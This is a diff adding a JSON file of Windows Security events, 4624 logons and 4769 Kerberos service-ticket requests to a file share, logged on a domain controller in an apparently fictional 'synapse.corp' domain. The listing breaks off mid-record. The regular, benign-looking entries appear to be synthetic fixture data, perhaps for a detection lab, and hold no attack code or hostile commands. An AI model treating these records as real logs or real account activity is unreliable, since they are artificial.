@@ -1,0 +1,1324 @@
+[
+  {
+    "EventRecordID": 10001,
+    "TimeCreated": "2026-08-28T14:00:06+00:00",
+    "EventID": 4624,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "svc_backup",
+      "TargetDomainName": "SYNAPSE",
+      "LogonType": 3,
+      "IpAddress": "10.10.10.76",
+      "IpPort": "60536",
+      "AuthenticationPackageName": "Kerberos",
+      "LogonProcessName": "Kerberos"
+    }
+  },
+  {
+    "EventRecordID": 10002,
+    "TimeCreated": "2026-08-28T14:00:07+00:00",
+    "EventID": 4769,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "svc_backup@SYNAPSE.CORP",
+      "ServiceName": "cifs/fs01.synapse.corp",
+      "TicketEncryptionType": "0x12",
+      "TicketOptions": "0x40810010",
+      "Status": "0x0",
+      "IpAddress": "::ffff:10.10.10.76"
+    }
+  },
+  {
+    "EventRecordID": 10003,
+    "TimeCreated": "2026-08-28T14:00:17+00:00",
+    "EventID": 4624,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "j.doe",
+      "TargetDomainName": "SYNAPSE",
+      "LogonType": 3,
+      "IpAddress": "10.10.10.86",
+      "IpPort": "58951",
+      "AuthenticationPackageName": "Kerberos",
+      "LogonProcessName": "Kerberos"
+    }
+  },
+  {
+    "EventRecordID": 10004,
+    "TimeCreated": "2026-08-28T14:00:18+00:00",
+    "EventID": 4769,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "j.doe@SYNAPSE.CORP",
+      "ServiceName": "cifs/fs01.synapse.corp",
+      "TicketEncryptionType": "0x12",
+      "TicketOptions": "0x40810010",
+      "Status": "0x0",
+      "IpAddress": "::ffff:10.10.10.86"
+    }
+  },
+  {
+    "EventRecordID": 10005,
+    "TimeCreated": "2026-08-28T14:00:32+00:00",
+    "EventID": 4624,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "svc_backup",
+      "TargetDomainName": "SYNAPSE",
+      "LogonType": 3,
+      "IpAddress": "10.10.10.60",
+      "IpPort": "58781",
+      "AuthenticationPackageName": "Kerberos",
+      "LogonProcessName": "Kerberos"
+    }
+  },
+  {
+    "EventRecordID": 10006,
+    "TimeCreated": "2026-08-28T14:00:33+00:00",
+    "EventID": 4769,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "svc_backup@SYNAPSE.CORP",
+      "ServiceName": "cifs/fs01.synapse.corp",
+      "TicketEncryptionType": "0x12",
+      "TicketOptions": "0x40810010",
+      "Status": "0x0",
+      "IpAddress": "::ffff:10.10.10.60"
+    }
+  },
+  {
+    "EventRecordID": 10007,
+    "TimeCreated": "2026-08-28T14:00:51+00:00",
+    "EventID": 4624,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "s.connor",
+      "TargetDomainName": "SYNAPSE",
+      "LogonType": 3,
+      "IpAddress": "10.10.10.50",
+      "IpPort": "63591",
+      "AuthenticationPackageName": "Kerberos",
+      "LogonProcessName": "Kerberos"
+    }
+  },
+  {
+    "EventRecordID": 10008,
+    "TimeCreated": "2026-08-28T14:00:52+00:00",
+    "EventID": 4769,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "s.connor@SYNAPSE.CORP",
+      "ServiceName": "cifs/fs01.synapse.corp",
+      "TicketEncryptionType": "0x12",
+      "TicketOptions": "0x40810010",
+      "Status": "0x0",
+      "IpAddress": "::ffff:10.10.10.50"
+    }
+  },
+  {
+    "EventRecordID": 10009,
+    "TimeCreated": "2026-08-28T14:01:04+00:00",
+    "EventID": 4624,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "a.vance",
+      "TargetDomainName": "SYNAPSE",
+      "LogonType": 3,
+      "IpAddress": "10.10.10.54",
+      "IpPort": "55505",
+      "AuthenticationPackageName": "Kerberos",
+      "LogonProcessName": "Kerberos"
+    }
+  },
+  {
+    "EventRecordID": 10010,
+    "TimeCreated": "2026-08-28T14:01:05+00:00",
+    "EventID": 4769,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "a.vance@SYNAPSE.CORP",
+      "ServiceName": "cifs/fs01.synapse.corp",
+      "TicketEncryptionType": "0x12",
+      "TicketOptions": "0x40810010",
+      "Status": "0x0",
+      "IpAddress": "::ffff:10.10.10.54"
+    }
+  },
+  {
+    "EventRecordID": 10011,
+    "TimeCreated": "2026-08-28T14:01:16+00:00",
+    "EventID": 4624,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "a.vance",
+      "TargetDomainName": "SYNAPSE",
+      "LogonType": 3,
+      "IpAddress": "10.10.10.97",
+      "IpPort": "65268",
+      "AuthenticationPackageName": "Kerberos",
+      "LogonProcessName": "Kerberos"
+    }
+  },
+  {
+    "EventRecordID": 10012,
+    "TimeCreated": "2026-08-28T14:01:17+00:00",
+    "EventID": 4769,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "a.vance@SYNAPSE.CORP",
+      "ServiceName": "cifs/fs01.synapse.corp",
+      "TicketEncryptionType": "0x12",
+      "TicketOptions": "0x40810010",
+      "Status": "0x0",
+      "IpAddress": "::ffff:10.10.10.97"
+    }
+  },
+  {
+    "EventRecordID": 10013,
+    "TimeCreated": "2026-08-28T14:01:33+00:00",
+    "EventID": 4624,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "m.smith",
+      "TargetDomainName": "SYNAPSE",
+      "LogonType": 3,
+      "IpAddress": "10.10.10.87",
+      "IpPort": "61181",
+      "AuthenticationPackageName": "Kerberos",
+      "LogonProcessName": "Kerberos"
+    }
+  },
+  {
+    "EventRecordID": 10014,
+    "TimeCreated": "2026-08-28T14:01:34+00:00",
+    "EventID": 4769,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "m.smith@SYNAPSE.CORP",
+      "ServiceName": "cifs/fs01.synapse.corp",
+      "TicketEncryptionType": "0x12",
+      "TicketOptions": "0x40810010",
+      "Status": "0x0",
+      "IpAddress": "::ffff:10.10.10.87"
+    }
+  },
+  {
+    "EventRecordID": 10015,
+    "TimeCreated": "2026-08-28T14:01:49+00:00",
+    "EventID": 4624,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "m.smith",
+      "TargetDomainName": "SYNAPSE",
+      "LogonType": 3,
+      "IpAddress": "10.10.10.69",
+      "IpPort": "53290",
+      "AuthenticationPackageName": "Kerberos",
+      "LogonProcessName": "Kerberos"
+    }
+  },
+  {
+    "EventRecordID": 10016,
+    "TimeCreated": "2026-08-28T14:01:50+00:00",
+    "EventID": 4769,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "m.smith@SYNAPSE.CORP",
+      "ServiceName": "cifs/fs01.synapse.corp",
+      "TicketEncryptionType": "0x12",
+      "TicketOptions": "0x40810010",
+      "Status": "0x0",
+      "IpAddress": "::ffff:10.10.10.69"
+    }
+  },
+  {
+    "EventRecordID": 10017,
+    "TimeCreated": "2026-08-28T14:02:05+00:00",
+    "EventID": 4624,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "a.vance",
+      "TargetDomainName": "SYNAPSE",
+      "LogonType": 3,
+      "IpAddress": "10.10.10.66",
+      "IpPort": "50459",
+      "AuthenticationPackageName": "Kerberos",
+      "LogonProcessName": "Kerberos"
+    }
+  },
+  {
+    "EventRecordID": 10018,
+    "TimeCreated": "2026-08-28T14:02:06+00:00",
+    "EventID": 4769,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "a.vance@SYNAPSE.CORP",
+      "ServiceName": "cifs/fs01.synapse.corp",
+      "TicketEncryptionType": "0x12",
+      "TicketOptions": "0x40810010",
+      "Status": "0x0",
+      "IpAddress": "::ffff:10.10.10.66"
+    }
+  },
+  {
+    "EventRecordID": 10019,
+    "TimeCreated": "2026-08-28T14:02:19+00:00",
+    "EventID": 4624,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "svc_backup",
+      "TargetDomainName": "SYNAPSE",
+      "LogonType": 3,
+      "IpAddress": "10.10.10.55",
+      "IpPort": "63170",
+      "AuthenticationPackageName": "Kerberos",
+      "LogonProcessName": "Kerberos"
+    }
+  },
+  {
+    "EventRecordID": 10020,
+    "TimeCreated": "2026-08-28T14:02:20+00:00",
+    "EventID": 4769,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "svc_backup@SYNAPSE.CORP",
+      "ServiceName": "cifs/fs01.synapse.corp",
+      "TicketEncryptionType": "0x12",
+      "TicketOptions": "0x40810010",
+      "Status": "0x0",
+      "IpAddress": "::ffff:10.10.10.55"
+    }
+  },
+  {
+    "EventRecordID": 10021,
+    "TimeCreated": "2026-08-28T14:02:37+00:00",
+    "EventID": 4624,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "HEALTHCHECK$",
+      "TargetDomainName": "SYNAPSE",
+      "LogonType": 3,
+      "IpAddress": "10.10.10.68",
+      "IpPort": "58758",
+      "AuthenticationPackageName": "Kerberos",
+      "LogonProcessName": "Kerberos"
+    }
+  },
+  {
+    "EventRecordID": 10022,
+    "TimeCreated": "2026-08-28T14:02:38+00:00",
+    "EventID": 4769,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "HEALTHCHECK$@SYNAPSE.CORP",
+      "ServiceName": "cifs/fs01.synapse.corp",
+      "TicketEncryptionType": "0x12",
+      "TicketOptions": "0x40810010",
+      "Status": "0x0",
+      "IpAddress": "::ffff:10.10.10.68"
+    }
+  },
+  {
+    "EventRecordID": 10023,
+    "TimeCreated": "2026-08-28T14:02:52+00:00",
+    "EventID": 4624,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "HEALTHCHECK$",
+      "TargetDomainName": "SYNAPSE",
+      "LogonType": 3,
+      "IpAddress": "10.10.10.56",
+      "IpPort": "49652",
+      "AuthenticationPackageName": "Kerberos",
+      "LogonProcessName": "Kerberos"
+    }
+  },
+  {
+    "EventRecordID": 10024,
+    "TimeCreated": "2026-08-28T14:02:53+00:00",
+    "EventID": 4769,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "HEALTHCHECK$@SYNAPSE.CORP",
+      "ServiceName": "cifs/fs01.synapse.corp",
+      "TicketEncryptionType": "0x12",
+      "TicketOptions": "0x40810010",
+      "Status": "0x0",
+      "IpAddress": "::ffff:10.10.10.56"
+    }
+  },
+  {
+    "EventRecordID": 10025,
+    "TimeCreated": "2026-08-28T14:03:08+00:00",
+    "EventID": 4624,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "s.connor",
+      "TargetDomainName": "SYNAPSE",
+      "LogonType": 3,
+      "IpAddress": "10.10.10.69",
+      "IpPort": "51183",
+      "AuthenticationPackageName": "Kerberos",
+      "LogonProcessName": "Kerberos"
+    }
+  },
+  {
+    "EventRecordID": 10026,
+    "TimeCreated": "2026-08-28T14:03:09+00:00",
+    "EventID": 4769,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "s.connor@SYNAPSE.CORP",
+      "ServiceName": "cifs/fs01.synapse.corp",
+      "TicketEncryptionType": "0x12",
+      "TicketOptions": "0x40810010",
+      "Status": "0x0",
+      "IpAddress": "::ffff:10.10.10.69"
+    }
+  },
+  {
+    "EventRecordID": 10027,
+    "TimeCreated": "2026-08-28T14:03:16+00:00",
+    "EventID": 4624,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "svc_backup",
+      "TargetDomainName": "SYNAPSE",
+      "LogonType": 3,
+      "IpAddress": "10.10.10.80",
+      "IpPort": "56631",
+      "AuthenticationPackageName": "Kerberos",
+      "LogonProcessName": "Kerberos"
+    }
+  },
+  {
+    "EventRecordID": 10028,
+    "TimeCreated": "2026-08-28T14:03:17+00:00",
+    "EventID": 4769,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "svc_backup@SYNAPSE.CORP",
+      "ServiceName": "cifs/fs01.synapse.corp",
+      "TicketEncryptionType": "0x12",
+      "TicketOptions": "0x40810010",
+      "Status": "0x0",
+      "IpAddress": "::ffff:10.10.10.80"
+    }
+  },
+  {
+    "EventRecordID": 10029,
+    "TimeCreated": "2026-08-28T14:03:37+00:00",
+    "EventID": 4624,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "a.vance",
+      "TargetDomainName": "SYNAPSE",
+      "LogonType": 3,
+      "IpAddress": "10.10.10.55",
+      "IpPort": "52397",
+      "AuthenticationPackageName": "Kerberos",
+      "LogonProcessName": "Kerberos"
+    }
+  },
+  {
+    "EventRecordID": 10030,
+    "TimeCreated": "2026-08-28T14:03:38+00:00",
+    "EventID": 4769,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "a.vance@SYNAPSE.CORP",
+      "ServiceName": "cifs/fs01.synapse.corp",
+      "TicketEncryptionType": "0x12",
+      "TicketOptions": "0x40810010",
+      "Status": "0x0",
+      "IpAddress": "::ffff:10.10.10.55"
+    }
+  },
+  {
+    "EventRecordID": 10031,
+    "TimeCreated": "2026-08-28T14:03:46+00:00",
+    "EventID": 4624,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "a.vance",
+      "TargetDomainName": "SYNAPSE",
+      "LogonType": 3,
+      "IpAddress": "10.10.10.87",
+      "IpPort": "65390",
+      "AuthenticationPackageName": "Kerberos",
+      "LogonProcessName": "Kerberos"
+    }
+  },
+  {
+    "EventRecordID": 10032,
+    "TimeCreated": "2026-08-28T14:03:47+00:00",
+    "EventID": 4769,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "a.vance@SYNAPSE.CORP",
+      "ServiceName": "cifs/fs01.synapse.corp",
+      "TicketEncryptionType": "0x12",
+      "TicketOptions": "0x40810010",
+      "Status": "0x0",
+      "IpAddress": "::ffff:10.10.10.87"
+    }
+  },
+  {
+    "EventRecordID": 10033,
+    "TimeCreated": "2026-08-28T14:04:03+00:00",
+    "EventID": 4624,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "HEALTHCHECK$",
+      "TargetDomainName": "SYNAPSE",
+      "LogonType": 3,
+      "IpAddress": "10.10.10.59",
+      "IpPort": "50956",
+      "AuthenticationPackageName": "Kerberos",
+      "LogonProcessName": "Kerberos"
+    }
+  },
+  {
+    "EventRecordID": 10034,
+    "TimeCreated": "2026-08-28T14:04:04+00:00",
+    "EventID": 4769,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "HEALTHCHECK$@SYNAPSE.CORP",
+      "ServiceName": "cifs/fs01.synapse.corp",
+      "TicketEncryptionType": "0x12",
+      "TicketOptions": "0x40810010",
+      "Status": "0x0",
+      "IpAddress": "::ffff:10.10.10.59"
+    }
+  },
+  {
+    "EventRecordID": 10035,
+    "TimeCreated": "2026-08-28T14:04:22+00:00",
+    "EventID": 4624,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "m.smith",
+      "TargetDomainName": "SYNAPSE",
+      "LogonType": 3,
+      "IpAddress": "10.10.10.77",
+      "IpPort": "60750",
+      "AuthenticationPackageName": "Kerberos",
+      "LogonProcessName": "Kerberos"
+    }
+  },
+  {
+    "EventRecordID": 10036,
+    "TimeCreated": "2026-08-28T14:04:23+00:00",
+    "EventID": 4769,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "m.smith@SYNAPSE.CORP",
+      "ServiceName": "cifs/fs01.synapse.corp",
+      "TicketEncryptionType": "0x12",
+      "TicketOptions": "0x40810010",
+      "Status": "0x0",
+      "IpAddress": "::ffff:10.10.10.77"
+    }
+  },
+  {
+    "EventRecordID": 10037,
+    "TimeCreated": "2026-08-28T14:04:31+00:00",
+    "EventID": 4624,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "s.connor",
+      "TargetDomainName": "SYNAPSE",
+      "LogonType": 3,
+      "IpAddress": "10.10.10.70",
+      "IpPort": "56145",
+      "AuthenticationPackageName": "Kerberos",
+      "LogonProcessName": "Kerberos"
+    }
+  },
+  {
+    "EventRecordID": 10038,
+    "TimeCreated": "2026-08-28T14:04:32+00:00",
+    "EventID": 4769,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "s.connor@SYNAPSE.CORP",
+      "ServiceName": "cifs/fs01.synapse.corp",
+      "TicketEncryptionType": "0x12",
+      "TicketOptions": "0x40810010",
+      "Status": "0x0",
+      "IpAddress": "::ffff:10.10.10.70"
+    }
+  },
+  {
+    "EventRecordID": 10039,
+    "TimeCreated": "2026-08-28T14:04:53+00:00",
+    "EventID": 4624,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "a.vance",
+      "TargetDomainName": "SYNAPSE",
+      "LogonType": 3,
+      "IpAddress": "10.10.10.64",
+      "IpPort": "59376",
+      "AuthenticationPackageName": "Kerberos",
+      "LogonProcessName": "Kerberos"
+    }
+  },
+  {
+    "EventRecordID": 10040,
+    "TimeCreated": "2026-08-28T14:04:54+00:00",
+    "EventID": 4769,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "a.vance@SYNAPSE.CORP",
+      "ServiceName": "cifs/fs01.synapse.corp",
+      "TicketEncryptionType": "0x12",
+      "TicketOptions": "0x40810010",
+      "Status": "0x0",
+      "IpAddress": "::ffff:10.10.10.64"
+    }
+  },
+  {
+    "EventRecordID": 10041,
+    "TimeCreated": "2026-08-28T14:05:09+00:00",
+    "EventID": 4624,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "svc_backup",
+      "TargetDomainName": "SYNAPSE",
+      "LogonType": 3,
+      "IpAddress": "10.10.10.86",
+      "IpPort": "54726",
+      "AuthenticationPackageName": "Kerberos",
+      "LogonProcessName": "Kerberos"
+    }
+  },
+  {
+    "EventRecordID": 10042,
+    "TimeCreated": "2026-08-28T14:05:10+00:00",
+    "EventID": 4769,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "svc_backup@SYNAPSE.CORP",
+      "ServiceName": "cifs/fs01.synapse.corp",
+      "TicketEncryptionType": "0x12",
+      "TicketOptions": "0x40810010",
+      "Status": "0x0",
+      "IpAddress": "::ffff:10.10.10.86"
+    }
+  },
+  {
+    "EventRecordID": 10043,
+    "TimeCreated": "2026-08-28T14:05:19+00:00",
+    "EventID": 4624,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "m.smith",
+      "TargetDomainName": "SYNAPSE",
+      "LogonType": 3,
+      "IpAddress": "10.10.10.51",
+      "IpPort": "52802",
+      "AuthenticationPackageName": "Kerberos",
+      "LogonProcessName": "Kerberos"
+    }
+  },
+  {
+    "EventRecordID": 10044,
+    "TimeCreated": "2026-08-28T14:05:20+00:00",
+    "EventID": 4769,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "m.smith@SYNAPSE.CORP",
+      "ServiceName": "cifs/fs01.synapse.corp",
+      "TicketEncryptionType": "0x12",
+      "TicketOptions": "0x40810010",
+      "Status": "0x0",
+      "IpAddress": "::ffff:10.10.10.51"
+    }
+  },
+  {
+    "EventRecordID": 10045,
+    "TimeCreated": "2026-08-28T14:05:33+00:00",
+    "EventID": 4624,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "m.smith",
+      "TargetDomainName": "SYNAPSE",
+      "LogonType": 3,
+      "IpAddress": "10.10.10.74",
+      "IpPort": "51332",
+      "AuthenticationPackageName": "Kerberos",
+      "LogonProcessName": "Kerberos"
+    }
+  },
+  {
+    "EventRecordID": 10046,
+    "TimeCreated": "2026-08-28T14:05:34+00:00",
+    "EventID": 4769,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "m.smith@SYNAPSE.CORP",
+      "ServiceName": "cifs/fs01.synapse.corp",
+      "TicketEncryptionType": "0x12",
+      "TicketOptions": "0x40810010",
+      "Status": "0x0",
+      "IpAddress": "::ffff:10.10.10.74"
+    }
+  },
+  {
+    "EventRecordID": 10047,
+    "TimeCreated": "2026-08-28T14:05:52+00:00",
+    "EventID": 4624,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "s.connor",
+      "TargetDomainName": "SYNAPSE",
+      "LogonType": 3,
+      "IpAddress": "10.10.10.52",
+      "IpPort": "61976",
+      "AuthenticationPackageName": "Kerberos",
+      "LogonProcessName": "Kerberos"
+    }
+  },
+  {
+    "EventRecordID": 10048,
+    "TimeCreated": "2026-08-28T14:05:53+00:00",
+    "EventID": 4769,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "s.connor@SYNAPSE.CORP",
+      "ServiceName": "cifs/fs01.synapse.corp",
+      "TicketEncryptionType": "0x12",
+      "TicketOptions": "0x40810010",
+      "Status": "0x0",
+      "IpAddress": "::ffff:10.10.10.52"
+    }
+  },
+  {
+    "EventRecordID": 10049,
+    "TimeCreated": "2026-08-28T14:06:06+00:00",
+    "EventID": 4624,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "j.doe",
+      "TargetDomainName": "SYNAPSE",
+      "LogonType": 3,
+      "IpAddress": "10.10.10.79",
+      "IpPort": "64955",
+      "AuthenticationPackageName": "Kerberos",
+      "LogonProcessName": "Kerberos"
+    }
+  },
+  {
+    "EventRecordID": 10050,
+    "TimeCreated": "2026-08-28T14:06:07+00:00",
+    "EventID": 4769,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "j.doe@SYNAPSE.CORP",
+      "ServiceName": "cifs/fs01.synapse.corp",
+      "TicketEncryptionType": "0x12",
+      "TicketOptions": "0x40810010",
+      "Status": "0x0",
+      "IpAddress": "::ffff:10.10.10.79"
+    }
+  },
+  {
+    "EventRecordID": 10051,
+    "TimeCreated": "2026-08-28T14:06:18+00:00",
+    "EventID": 4624,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "svc_backup",
+      "TargetDomainName": "SYNAPSE",
+      "LogonType": 3,
+      "IpAddress": "10.10.10.99",
+      "IpPort": "50572",
+      "AuthenticationPackageName": "Kerberos",
+      "LogonProcessName": "Kerberos"
+    }
+  },
+  {
+    "EventRecordID": 10052,
+    "TimeCreated": "2026-08-28T14:06:19+00:00",
+    "EventID": 4769,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "svc_backup@SYNAPSE.CORP",
+      "ServiceName": "cifs/fs01.synapse.corp",
+      "TicketEncryptionType": "0x12",
+      "TicketOptions": "0x40810010",
+      "Status": "0x0",
+      "IpAddress": "::ffff:10.10.10.99"
+    }
+  },
+  {
+    "EventRecordID": 10053,
+    "TimeCreated": "2026-08-28T14:06:39+00:00",
+    "EventID": 4624,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "svc_backup",
+      "TargetDomainName": "SYNAPSE",
+      "LogonType": 3,
+      "IpAddress": "10.10.10.52",
+      "IpPort": "61264",
+      "AuthenticationPackageName": "Kerberos",
+      "LogonProcessName": "Kerberos"
+    }
+  },
+  {
+    "EventRecordID": 10054,
+    "TimeCreated": "2026-08-28T14:06:40+00:00",
+    "EventID": 4769,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "svc_backup@SYNAPSE.CORP",
+      "ServiceName": "cifs/fs01.synapse.corp",
+      "TicketEncryptionType": "0x12",
+      "TicketOptions": "0x40810010",
+      "Status": "0x0",
+      "IpAddress": "::ffff:10.10.10.52"
+    }
+  },
+  {
+    "EventRecordID": 10055,
+    "TimeCreated": "2026-08-28T14:06:53+00:00",
+    "EventID": 4624,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "m.smith",
+      "TargetDomainName": "SYNAPSE",
+      "LogonType": 3,
+      "IpAddress": "10.10.10.60",
+      "IpPort": "59393",
+      "AuthenticationPackageName": "Kerberos",
+      "LogonProcessName": "Kerberos"
+    }
+  },
+  {
+    "EventRecordID": 10056,
+    "TimeCreated": "2026-08-28T14:06:54+00:00",
+    "EventID": 4769,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "m.smith@SYNAPSE.CORP",
+      "ServiceName": "cifs/fs01.synapse.corp",
+      "TicketEncryptionType": "0x12",
+      "TicketOptions": "0x40810010",
+      "Status": "0x0",
+      "IpAddress": "::ffff:10.10.10.60"
+    }
+  },
+  {
+    "EventRecordID": 10057,
+    "TimeCreated": "2026-08-28T14:07:09+00:00",
+    "EventID": 4624,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "HEALTHCHECK$",
+      "TargetDomainName": "SYNAPSE",
+      "LogonType": 3,
+      "IpAddress": "10.10.10.57",
+      "IpPort": "62065",
+      "AuthenticationPackageName": "Kerberos",
+      "LogonProcessName": "Kerberos"
+    }
+  },
+  {
+    "EventRecordID": 10058,
+    "TimeCreated": "2026-08-28T14:07:10+00:00",
+    "EventID": 4769,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "HEALTHCHECK$@SYNAPSE.CORP",
+      "ServiceName": "cifs/fs01.synapse.corp",
+      "TicketEncryptionType": "0x12",
+      "TicketOptions": "0x40810010",
+      "Status": "0x0",
+      "IpAddress": "::ffff:10.10.10.57"
+    }
+  },
+  {
+    "EventRecordID": 10059,
+    "TimeCreated": "2026-08-28T14:07:19+00:00",
+    "EventID": 4624,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "a.vance",
+      "TargetDomainName": "SYNAPSE",
+      "LogonType": 3,
+      "IpAddress": "10.10.10.72",
+      "IpPort": "62261",
+      "AuthenticationPackageName": "Kerberos",
+      "LogonProcessName": "Kerberos"
+    }
+  },
+  {
+    "EventRecordID": 10060,
+    "TimeCreated": "2026-08-28T14:07:20+00:00",
+    "EventID": 4769,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "a.vance@SYNAPSE.CORP",
+      "ServiceName": "cifs/fs01.synapse.corp",
+      "TicketEncryptionType": "0x12",
+      "TicketOptions": "0x40810010",
+      "Status": "0x0",
+      "IpAddress": "::ffff:10.10.10.72"
+    }
+  },
+  {
+    "EventRecordID": 10061,
+    "TimeCreated": "2026-08-28T14:07:39+00:00",
+    "EventID": 4624,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "m.smith",
+      "TargetDomainName": "SYNAPSE",
+      "LogonType": 3,
+      "IpAddress": "10.10.10.72",
+      "IpPort": "63555",
+      "AuthenticationPackageName": "Kerberos",
+      "LogonProcessName": "Kerberos"
+    }
+  },
+  {
+    "EventRecordID": 10062,
+    "TimeCreated": "2026-08-28T14:07:40+00:00",
+    "EventID": 4769,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "m.smith@SYNAPSE.CORP",
+      "ServiceName": "cifs/fs01.synapse.corp",
+      "TicketEncryptionType": "0x12",
+      "TicketOptions": "0x40810010",
+      "Status": "0x0",
+      "IpAddress": "::ffff:10.10.10.72"
+    }
+  },
+  {
+    "EventRecordID": 10063,
+    "TimeCreated": "2026-08-28T14:07:52+00:00",
+    "EventID": 4624,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "m.smith",
+      "TargetDomainName": "SYNAPSE",
+      "LogonType": 3,
+      "IpAddress": "10.10.10.97",
+      "IpPort": "50392",
+      "AuthenticationPackageName": "Kerberos",
+      "LogonProcessName": "Kerberos"
+    }
+  },
+  {
+    "EventRecordID": 10064,
+    "TimeCreated": "2026-08-28T14:07:53+00:00",
+    "EventID": 4769,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "m.smith@SYNAPSE.CORP",
+      "ServiceName": "cifs/fs01.synapse.corp",
+      "TicketEncryptionType": "0x12",
+      "TicketOptions": "0x40810010",
+      "Status": "0x0",
